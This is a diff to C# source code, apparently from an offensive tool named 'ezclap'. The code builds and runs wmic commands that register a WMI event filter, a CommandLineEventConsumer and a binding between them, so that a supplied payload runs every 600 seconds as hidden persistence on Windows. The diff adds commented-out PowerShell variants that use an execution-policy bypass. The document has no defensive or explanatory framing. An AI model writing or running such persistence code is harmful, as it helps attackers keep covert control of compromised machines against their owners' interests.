@@ -38,7 +38,11 @@ namespace ezclap
             string arg1 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"" + name + "\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"";
             string arg2 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"" + name + "\", ExecutablePath=\"" + payload + "\",CommandLineTemplate=\"" + payload + "\" ";
             string arg3 = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"" + name + "\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"" + name + "\\\"\"";
-            
+
+            //System.Diagnostics.Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-exec bypass -nop -c " + arg1);
+            //System.Diagnostics.Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-exec bypass -nop -c " + arg2);
+            //System.Diagnostics.Process.Start(@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-exec bypass -nop -c " + arg3);
+
             System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg1);
             System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg2);
             System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg3);
